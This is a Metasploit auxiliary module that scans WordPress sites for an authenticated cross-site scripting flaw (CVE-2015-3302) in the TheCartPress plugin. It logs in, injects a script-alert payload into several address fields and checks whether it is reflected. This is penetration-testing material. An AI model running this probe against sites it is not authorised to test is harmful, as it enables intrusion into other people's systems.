##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'WordPress TheCartPress Plugin XSS Scanner',
      'Description' => %q{
      This module attempts to exploit a authenticated Cross-Site Scripting in TheCartPress Plugin for WordPress,
      version 1.3.9 and likely prior in order if the instance is vulnerable. (Tested with TheCartPress 1.3.8.2 version,
      but 1.3.9 works).
      },
      'Author'      =>
        [
          'High-Tech Bridge', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          ['CVE', '2015-3302'],
          ['EDB', '36860'],
          ['WPVDB', '7951'],
          ['URL', 'https://www.htbridge.com/advisory/HTB23254']
        ],
      'DisclosureDate' => 'Apr 29 2015'
    ))

    register_options(
      [
        OptString.new('WP_USER', [true, 'A valid username', nil]),
        OptString.new('WP_PASSWORD', [true, 'Valid password for the provided username', nil])
      ], self.class)
  end

  def check
    check_plugin_version_from_readme('thecartpress')
  end

  def user
    datastore['WP_USER']
  end

  def password
    datastore['WP_PASSWORD']
  end

  def run_host(ip)
    print_status("#{peer} - Trying to login as #{user}")
    cookie = wordpress_login(user, password)
    if cookie.nil?
      print_error("#{peer} - Unable to login as #{user}")
      return
    end
    print_good("#{peer} - Login successful")

    xss = Rex::Text.rand_text_alpha(8)
    xss_payload = "\"'><script>alert(\"#{xss}\");</script>"

    res = send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_backend, 'admin.php'),
      'vars_get' => {
        'page'  => normalize_uri('thecartpress', 'admin', 'AddressEdit.php'),
        'address_name' => xss_payload,
        'firstname' => xss_payload,
        'lastname'  => xss_payload,
        'street'    => xss_payload,
        'city'      => xss_payload,
        'postcode'  => xss_payload,
        'email'     => xss_payload
      },
      'cookie'      => cookie
    )

    unless res && res.body
      print_error("#{peer} - Server did not respond in an expected way")
      return
    end

    if res.code == 200 && res.body =~ /#{xss}/
      print_good("#{peer} - Vulnerable to Cross-Site Scripting the \"TheCartPress 1.3.9\" plugin for WordPress")
      p = store_local('wp_thecartpress.http', 'text/html', res.body, "#{xss}")
      print_good("Save in: #{p}")
    else
      print_error("#{peer} - Failed, maybe the target isn't vulnerable.")
    end
  end
end
